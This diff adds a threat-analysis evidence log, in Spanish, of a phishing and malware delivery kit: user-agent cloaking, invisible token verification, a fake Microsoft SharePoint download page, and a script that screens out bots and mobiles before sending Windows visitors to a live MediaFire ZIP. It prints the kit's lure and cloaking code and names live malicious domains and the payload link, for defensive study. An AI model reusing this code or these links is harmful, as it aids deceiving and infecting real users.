@@ -1,0 +1,471 @@
+# Evidencia: análisis dinámico 2026-10-13.
+# Cliente: curl presentándose como Chrome 129 en Windows 10 (Accept-Language es-CL). Salida desde la red del analista (Santiago).
+# NO se descargó el ZIP final: solo se leyeron sus metadatos en la API pública de MediaFire.
+
+## A. Navegador integrado (UA de Mac) siguiendo share.google @ 2026-10-13T13:27:36Z
+URL final: https://vltwjsm.com/BwdcIIOHOH0n.html  título: No compatible  (ver 03_captura_mac_no_compatible_*.jpg)
+
+## B. HEAD / con UA Mac vs Windows @ 2026-10-13T13:27:58Z
+--- MAC
+HTTP/1.1 302 Found
+Date: Tue, 13 Oct 2026 13:27:59 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Set-Cookie: PHPSESSID=iddhfiqms42hb2kub49enmgbk9; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: BwdcIIOHOH0n.html
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+--- WIN
+HTTP/1.1 302 Found
+Date: Tue, 13 Oct 2026 13:27:59 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Set-Cookie: PHPSESSID=andkmh8lnejnuo8dqqadpmm9j4; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: diqOSOFpQP02G.php?tipo=inv&WEE=%2F&jh=1791898079&x1=956c20d830dadef79ee178df97b67e004cf492a9d7ff45a446ee0ae75c10edc7
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+## C. Página de verificación invisible (vltwjsm.com, rama Windows) @ 2026-10-13T13:28:26Z
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:28:27 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1322
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Verificación</title>
+<link rel="stylesheet" href="kPouDsyvpmSCExP07V.css">
+</head>
+<body>
+<div class="card">
+
+  <div class="spin-wrap">
+    <svg class="spin-svg" viewBox="0 0 56 56">
+      <circle class="spin-track" cx="28" cy="28" r="22"/>
+      <circle class="spin-arc"   cx="28" cy="28" r="22"/>
+    </svg>
+  </div>
+  <p class="verif-txt">Verificando...</p>
+
+
+</div>
+<script>
+var RETORNO = "\/";
+var JS_TS   = 1791898107;
+var JS_TOK  = "08cb47e8fb497b91a42e614944317ab6796a073f06a9550ef5cd6abb972f12ff";
+var CHK     = "";
+var VALIDAR = 'bmQebaQoaNDdP08E.php';
+var TIPO    = "inv";
+var GRID    = [];
+var CAT     = [];
+var ERR_TX  = "Incorrecto. Intente de nuevo.";
+
+(async function(){
+  await new Promise(r=>setTimeout(r, 1100+Math.random()*600)); // >= 1100ms garante time()-ts >= 1s no servidor
+  await req({tipo:'inv',t:JS_TOK,ts:JS_TS});
+  location.replace(RETORNO);
+})();
+
+
+async function req(data){
+  try{
+    var r=await fetch(VALIDAR,{method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(data)});
+    return r.ok?r.json():null;
+  }catch(e){return null;}
+}
+</script>
+</body>
+</html>
+
+## D. POST de validación y HEAD de / validado @ 2026-10-13T13:28:54Z
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:28:55 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 11
+Content-Type: application/json
+
+{"ok":true}
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:28:55 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Refresh: 2; URL=https://2026pdf.com/
+Content-Length: 1940
+Content-Type: text/html; charset=UTF-8
+
+
+## E. / validado (vltwjsm.com) @ 2026-10-13T13:29:11Z
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:29:12 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Refresh: 2; URL=https://2026pdf.com/
+Content-Length: 1940
+Vary: Accept-Encoding
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Redirigiendo Santiago - </title><style>*{margin:0;padding:0;box-sizing:border-box}body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f3f2f1;font-family:-apple-system,"Segoe UI",sans-serif}.c{background:#fff;border-radius:14px;padding:48px 36px;max-width:360px;width:calc(100% - 32px);box-shadow:0 24px 60px rgba(0,0,0,.45);text-align:center}.w{width:52px;height:52px;margin:0 auto 18px}.s{width:52px;height:52px;transform:rotate(-90deg);animation:sp 1.1s linear infinite}@keyframes sp{to{transform:rotate(calc(-90deg + 360deg))}}.t{fill:none;stroke:rgba(128,128,128,.15);stroke-width:4}.a{fill:none;stroke:#0078d4;stroke-width:4;stroke-linecap:round;stroke-dasharray:100 200}h2{font-size:15px;font-weight:600;color:#323130;margin-bottom:6px}p{font-size:13px;color:#64748b}</style></head><body><div class="c"><div class="w"><svg class="s" viewBox="0 0 52 52"><circle class="t" cx="26" cy="26" r="20"/><circle class="a" cx="26" cy="26" r="20"/></svg></div><h2 id="h"></h2><p id="p"></p></div><script>var _nl=(navigator.language||"pt").toLowerCase();var _l=_nl.startsWith("fr")?"fr":_nl.startsWith("it")?"it":_nl.startsWith("es")?"es":_nl.startsWith("en")?"en":(_nl==="pt-pt"||_nl.startsWith("pt-pt"))?"pt-pt":_nl.startsWith("pt")?"pt-br":"pt-br";var TS={"pt-br":{"h":"Aguarde…","p":"Redirecionando para o arquivo."},"pt-pt":{"h":"Aguarde…","p":"A redirecionar para o ficheiro."},"es":{"h":"Un momento…","p":"Redirigiendo."},"en":{"h":"Please wait…","p":"Redirecting."},"fr":{"h":"Veuillez patienter…","p":"Redirection en cours."},"it":{"h":"Attendere…","p":"Reindirizzamento."}},x=TS[_l]||TS["pt-br"];document.getElementById("h").textContent=x.h;document.getElementById("p").textContent=x.p;window.location.replace("https:\/\/2026pdf.com\/");</script></body></html>
+
+## F. 2026pdf.com, mismo kit @ 2026-10-13T13:29:51Z a 13:30:20Z
+HTTP/1.1 302 Found
+Date: Tue, 13 Oct 2026 13:29:52 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Set-Cookie: PHPSESSID=v87sgg4iflrqs9s8g4hr73f17c; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: zRYtKmDeP08R.php?tipo=inv&5Co=%2F&u2=1791898192&Io=c185c4a15064b545a3b8249448df0de3aee29819cacf8291a5e0c7477614e062
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:30:06 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1318
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Verificación</title>
+<link rel="stylesheet" href="TdOuOWeSReoRP04I.css">
+</head>
+<body>
+<div class="card">
+
+  <div class="spin-wrap">
+    <svg class="spin-svg" viewBox="0 0 56 56">
+      <circle class="spin-track" cx="28" cy="28" r="22"/>
+      <circle class="spin-arc"   cx="28" cy="28" r="22"/>
+    </svg>
+  </div>
+  <p class="verif-txt">Verificando...</p>
+
+
+</div>
+<script>
+var RETORNO = "\/";
+var JS_TS   = 1791898206;
+var JS_TOK  = "3d8902f3662070815e58eb4ac9d97117ebb3b837678aae0de27cb784e1711f11";
+var CHK     = "";
+var VALIDAR = 'ysKrTKYLieP02C.php';
+var TIPO    = "inv";
+var GRID    = [];
+var CAT     = [];
+var ERR_TX  = "Incorrecto. Intente de nuevo.";
+
+(async function(){
+  await new Promise(r=>setTimeout(r, 1100+Math.random()*600)); // >= 1100ms garante time()-ts >= 1s no servidor
+  await req({tipo:'inv',t:JS_TOK,ts:JS_TS});
+  location.replace(RETORNO);
+})();
+
+
+async function req(data){
+  try{
+    var r=await fetch(VALIDAR,{method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(data)});
+    return r.ok?r.json():null;
+  }catch(e){return null;}
+}
+</script>
+</body>
+</html>
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:30:09 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 11
+Content-Type: application/json
+
+{"ok":true}
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:30:10 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Refresh: 2; URL=fFRPYfXQd0D0O/wXIgJPBSgsVXsP06F0HD0o.html?u8qMS9=43538cb251de8c275f6a341483b26cfd
+Content-Length: 1999
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:30:20 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Refresh: 2; URL=fFRPYfXQd0D0O/wXIgJPBSgsVXsP06F0HD0o.html?u8qMS9=83a4d96dcea15ae6819672c352b4c98f
+Content-Length: 1999
+Vary: Accept-Encoding
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Redirigiendo Santiago - </title><style>*{margin:0;padding:0;box-sizing:border-box}body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f3f2f1;font-family:-apple-system,"Segoe UI",sans-serif}.c{background:#fff;border-radius:14px;padding:48px 36px;max-width:360px;width:calc(100% - 32px);box-shadow:0 24px 60px rgba(0,0,0,.45);text-align:center}.w{width:52px;height:52px;margin:0 auto 18px}.s{width:52px;height:52px;transform:rotate(-90deg);animation:sp 1.1s linear infinite}@keyframes sp{to{transform:rotate(calc(-90deg + 360deg))}}.t{fill:none;stroke:rgba(128,128,128,.15);stroke-width:4}.a{fill:none;stroke:#0078d4;stroke-width:4;stroke-linecap:round;stroke-dasharray:100 200}h2{font-size:15px;font-weight:600;color:#323130;margin-bottom:6px}p{font-size:13px;color:#64748b}</style></head><body><div class="c"><div class="w"><svg class="s" viewBox="0 0 52 52"><circle class="t" cx="26" cy="26" r="20"/><circle class="a" cx="26" cy="26" r="20"/></svg></div><h2 id="h"></h2><p id="p"></p></div><script>var _nl=(navigator.language||"pt").toLowerCase();var _l=_nl.startsWith("fr")?"fr":_nl.startsWith("it")?"it":_nl.startsWith("es")?"es":_nl.startsWith("en")?"en":(_nl==="pt-pt"||_nl.startsWith("pt-pt"))?"pt-pt":_nl.startsWith("pt")?"pt-br":"pt-br";var TS={"pt-br":{"h":"Aguarde…","p":"Redirecionando para o arquivo."},"pt-pt":{"h":"Aguarde…","p":"A redirecionar para o ficheiro."},"es":{"h":"Un momento…","p":"Redirigiendo."},"en":{"h":"Please wait…","p":"Redirecting."},"fr":{"h":"Veuillez patienter…","p":"Redirection en cours."},"it":{"h":"Attendere…","p":"Reindirizzamento."}},x=TS[_l]||TS["pt-br"];document.getElementById("h").textContent=x.h;document.getElementById("p").textContent=x.p;window.location.replace("fFRPYfXQd0D0O\/wXIgJPBSgsVXsP06F0HD0o.html?u8qMS9=83a4d96dcea15ae6819672c352b4c98f");</script></body></html>
+
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:30:20 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Last-Modified: Tue, 13 Oct 2026 02:52:32 GMT
+ETag: "eb7-65dafe7ed1c00"
+Accept-Ranges: bytes
+Content-Length: 3767
+Vary: Accept-Encoding
+Content-Type: text/html
+
+
+## G. Página final falso SharePoint @ 2026-10-13T13:30:28Z
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:30:29 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Last-Modified: Tue, 13 Oct 2026 02:52:32 GMT
+ETag: "eb7-65dafe7ed1c00"
+Accept-Ranges: bytes
+Content-Length: 3767
+Vary: Accept-Encoding
+Content-Type: text/html
+
+<!DOCTYPE html><html lang="pt"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title id="pgT">Microsoft</title><link rel="stylesheet" href="IhpMvDATuhIctCP08B.css"></head><body>
+<header class="hdr"><div class="hl"><img src="iGGhdTXQ0V.png" class="hlogo" alt=""><span class="hname" id="hname"></span></div><div class="hr"><div class="usr">●</div></div></header>
+<main class="main">
+  <section class="preview"><img src="esbPefXgMfR0y.jpg" class="prev-img" alt=""></section>
+  <aside class="panel">
+    <div class="panel-inner">
+      <img src="iGGhdTXQ0V.png" class="plogo" alt="">
+      <p class="pd1" id="d1"></p>
+      <p class="pd2" id="d2"></p>
+      <div class="pfb"><span id="fn"></span><span class="chip" id="chip"></span></div>
+      <button id="dRnyEiSgpeOpWF02Q" class="db"><span id="cb"></span></button>
+      <p class="sec" id="sec"></p>
+    </div>
+  </aside>
+</main>
+<script>
+var _f=(function(){var d=new Date(),z=n=>String(n).padStart(2,"0");return z(d.getDate())+z(d.getMonth()+1)+d.getFullYear()+"_"+Math.floor(Math.random()*9e11+1e11)+".zip";})();
+var _nl=(navigator.language||"pt").toLowerCase();var _l=_nl.startsWith("fr")?"fr":_nl.startsWith("it")?"it":_nl.startsWith("es")?"es":_nl.startsWith("en")?"en":(_nl==="pt-pt"||_nl.startsWith("pt-pt"))?"pt-pt":_nl.startsWith("pt")?"pt-br":"pt-br";
+var TX={"pt-br":{t:"Microsoft SharePoint",d1:"Este arquivo foi compartilhado com você via SharePoint.",d2:"Baixe para visualizar no Microsoft Office.",btn:"Baixar Arquivo",chip:"✔ Microsoft · Verificado",sec:"Microsoft Corporation · Conexão Segura",alert:"Visualização não disponível.",pg:"Página 1 / 1"},"pt-pt":{t:"Microsoft SharePoint",d1:"Este ficheiro foi partilhado consigo via SharePoint.",d2:"Transfira para visualizar no Microsoft Office.",btn:"Transferir Ficheiro",chip:"✔ Microsoft · Verificado",sec:"Microsoft Corporation · Conexão Segura",alert:"Pré-visualização não disponível.",pg:"Página 1 / 1"},"es":{t:"Microsoft SharePoint",d1:"Este archivo fue compartido vía SharePoint.",d2:"Descargue para verlo en Microsoft Office.",btn:"Descargar Archivo",chip:"✔ Microsoft · Verificado",sec:"Microsoft Corporation · Conexão Segura",alert:"Vista previa no disponible.",pg:"Página 1 / 1"},"en":{t:"Microsoft SharePoint",d1:"This file was shared with you via SharePoint.",d2:"Download to view it in Microsoft Office.",btn:"Download File",chip:"✔ Microsoft · Verificado",sec:"Microsoft Corporation · Conexão Segura",alert:"Preview not available.",pg:"Page 1 / 1"},"fr":{t:"Microsoft SharePoint",d1:"Ce fichier a été partagé via SharePoint.",d2:"Téléchargez pour l'afficher dans Microsoft Office.",btn:"Télécharger le Fichier",chip:"✔ Microsoft · Verificado",sec:"Microsoft Corporation · Conexão Segura",alert:"Aperçu non disponible.",pg:"Page 1 / 1"},"it":{t:"Microsoft SharePoint",d1:"Questo file è stato condiviso tramite SharePoint.",d2:"Scarica per visualizzarlo in Microsoft Office.",btn:"Scarica File",chip:"✔ Microsoft · Verificado",sec:"Microsoft Corporation · Conexão Segura",alert:"Anteprima non disponibile.",pg:"Pagina 1 / 1"}};
+var T=TX[_l]||TX["pt-br"];
+var BRAND="Microsoft SharePoint";
+document.title=BRAND;
+document.getElementById("pgT").textContent=T.t;
+document.getElementById("hname").textContent=T.t;
+document.getElementById("d1").textContent=T.d1;
+document.getElementById("d2").textContent=T.d2;
+document.getElementById("fn").textContent=_f;
+document.getElementById("chip").textContent=T.chip;
+document.getElementById("cb").textContent=T.btn;
+document.getElementById("sec").textContent=T.sec;
+
+function a(){alert(T.alert);}
+</script><script src="XIWrOlotFZUPHP08L.js"></script></body></html>
+
+## H. Script de descarga XIWrOlotFZUPHP08L.js @ 2026-10-13T13:30:52Z
+// ui.js — lógica funcional do download
+// A UI (ui.html) decide como chamar: btn.onclick ou setTimeout automático
+(function () {
+  'use strict';
+
+  const EP      = 'LzyjUlSuNcP01Z.php';
+  const CMD_V   = 'KU';
+  const CMD_C   = 'uz';
+  const CMD_L   = 'Tz';
+  const CMD_LOG = 'aL';
+  const T_PARAM = 'u8qMS9';
+  const P_CMD   = 'Iwmn';
+  const MAX_DL  = 5;
+
+  const urlP  = new URLSearchParams(window.location.search);
+  const TOKEN = urlP.get(T_PARAM) || '';
+
+  // Extrai nome do arquivo da URL (Dropbox, MediaFire, generico)
+  function extractFilename(url) {
+    try {
+      // Dropbox: /scl/fi/{hash}/{filename}?params
+      let m = url.match(/\/scl\/fi\/[^/]+\/([^/?&#]+)/i);
+      if (m) return decodeURIComponent(m[1]);
+      // MediaFire: /file_premium/{hash}/{filename}/file
+      m = url.match(/mediafire\.com\/[^/]+\/[^/]+\/([^/]+)\/file/i);
+      if (m) return decodeURIComponent(m[1]);
+      // Generico: ultimo segmento de path com extensao
+      const path = new URL(url).pathname;
+      const parts = path.split('/').filter(Boolean);
+      const last = parts[parts.length - 1];
+      if (last && /\.[a-z0-9]{2,5}$/i.test(last)) return decodeURIComponent(last);
+    } catch(_) {}
+    // Fallback: DDMMYYYY_RANDOM.zip
+    const d = new Date();
+    const dd = String(d.getDate()).padStart(2,'0');
+    const mm = String(d.getMonth()+1).padStart(2,'0');
+    const yy = d.getFullYear();
+    return dd+mm+yy+'_'+Math.floor(Math.random()*9e11+1e11)+'.zip';
+  }
+
+  // Actualiza elementos de nome de arquivo na pagina
+  function setFilename(fname) {
+    if (!fname) return;
+    const els = [
+      document.getElementById('cFileName'),
+      document.getElementById('vFileName'),
+    ];
+    els.forEach(el => { if (el) el.textContent = fname; });
+    const szEl = document.getElementById('cFileSize');
+    if (szEl && szEl.textContent === '') szEl.textContent = fname.split('.').pop().toUpperCase();
+  }
+
+  // Ao carregar a pagina: valida token e pega nome do arquivo antecipadamente
+  window.addEventListener('DOMContentLoaded', async () => {
+    if (!TOKEN) return;
+    try {
+      const prev = await req(CMD_V, { [T_PARAM]: TOKEN });
+      if (prev?.fname) setFilename(prev.fname);
+    } catch(_) {}
+  });
+
+  // Expõe iniciarDownload() globalmente — ui.html decide como chamar
+  window.iniciarDownload = async function() {
+    const btn = document.getElementById('dRnyEiSgpeOpWF02Q');
+    if (btn) { btn.disabled = true; btn.style.opacity = '.7'; }
+
+
+    try {
+      const valid = await req(CMD_V, { [T_PARAM]: TOKEN });
+      if (!valid?.v) {
+        await logClick('bloqueado');
+        location.href = '../LJIfgocxgkH0u.html';
+        return;
+      }
+
+      const cnt = await req(CMD_C, { [T_PARAM]: TOKEN });
+      if ((cnt?.c ?? 0) >= MAX_DL) {
+        alert(getLang('exceeded'));
+        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
+        return;
+      }
+
+      const ua = navigator.userAgent;
+      if (/bot|crawl|spider|slurp/i.test(ua)) {
+        await logClick('bot');
+        location.href = '../LJIfgocxgkH0u.html';
+        return;
+      }
+      if (/Mobi|Android/i.test(ua)) {
+        await logClick('mobile');
+        location.href = '../otlxpRVBFH0x.html';
+        return;
+      }
+
+      const linkData = await req(CMD_L, { [T_PARAM]: TOKEN });
+      const link = linkData?.l;
+
+      if (!link) {
+        alert(getLang('unavail'));
+        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
+        return;
+      }
+
+      // Confirma o nome do arquivo com a URL real obtida
+      const realFname = extractFilename(link);
+      if (realFname) setFilename(realFname);
+
+      await logClick('liberado');
+      openLinkInNewTab(link);  // abre MediaFire em nova aba — historico do browser fica na pagina de download
+
+    } catch (_) {
+      if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
+    }
+  };  // fim de window.iniciarDownload
+
+  async function req(action, params = {}) {
+    try {
+      const qs  = new URLSearchParams({ [P_CMD]: action, ...params });
+      const res = await fetch(`${EP}?${qs}`);
+      return res.ok ? res.json() : null;
+    } catch (_) { return null; }
+  }
+
+  async function logClick(status) {
+    try {
+      await fetch(`${EP}?${P_CMD}=${CMD_LOG}`, {
+        method : 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body   : JSON.stringify({ t: TOKEN, s: status }),
+      });
+    } catch (_) {}
+  }
+
+  function getLang(key) {
+    if (typeof L !== 'undefined' && L[key]) return L[key];
+    return { exceeded: 'Límite alcanzado.', unavail: 'No disponible.' }[key] ?? '';
+  }
+
+
+  // Conecta ao botão se existir (modo com botão)
+  const _btn = document.getElementById('dRnyEiSgpeOpWF02Q');
+  if (_btn) _btn.addEventListener('click', window.iniciarDownload);
+
+// Redireciona na mesma aba — window.open() é bloqueado como popup em async callbacks
+function openLinkInNewTab(link) {
+    window.location.href = link;
+}
+})();
+
+## I. Endpoint del kit LzyjUlSuNcP01Z.php @ 2026-10-13T13:31:08Z
+--- Iwmn=KU
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:31:09 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Content-Length: 21
+Content-Type: application/json
+
+{"v":true,"fname":""}
+--- Iwmn=uz
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:31:10 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Content-Length: 7
+Content-Type: application/json
+
+{"c":0}
+--- Iwmn=Tz
+HTTP/1.1 200 OK
+Date: Tue, 13 Oct 2026 13:31:11 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Content-Length: 64
+Content-Type: application/json
+
+{"l":"https:\/\/www.mediafire.com\/file\/g15xjg3aawyvz7u\/file"}
+
+## J. API pública de MediaFire file/get_info @ 2026-10-13T13:31:18Z
+{"response":{"action":"file\/get_info","file_info":{"quickkey":"g15xjg3aawyvz7u","filename":"61256Trib-QEPVYnltnru_CB36U6194705.Copia.zip","ready":"yes","created":"2026-10-13 00:08:33","description":"","size":"3586327","privacy":"public","password_protected":"no","hash":"bd9575dbcbdc23b8a0f7cc026e627e26b27f0f9cbe61a9def37153229174afd7","filetype":"archive","mimetype":"application\/zip","owner_name":"Jo\u00e3o Machado-7lk6","flag":"0","permissions":{"value":"1","explicit":"0","read":"1","write":"0"},"revision":"254756","view":"0","edit":"0","links":{"normal_download":"https:\/\/www.mediafire.com\/file_premium\/g15xjg3aawyvz7u\/61256Trib-QEPVYnltnru_CB36U6194705.Copia.zip\/file"},"created_utc":"2026-10-13T05:08:33Z"},"result":"Success","current_api_version":"1.5"}}
+## K. Búsqueda del hash: MalwareBazaar 'Unauthorized' (sin clave), OTX 0 pulsos, urlscan 0 @ 2026-10-13T13:31:28Z
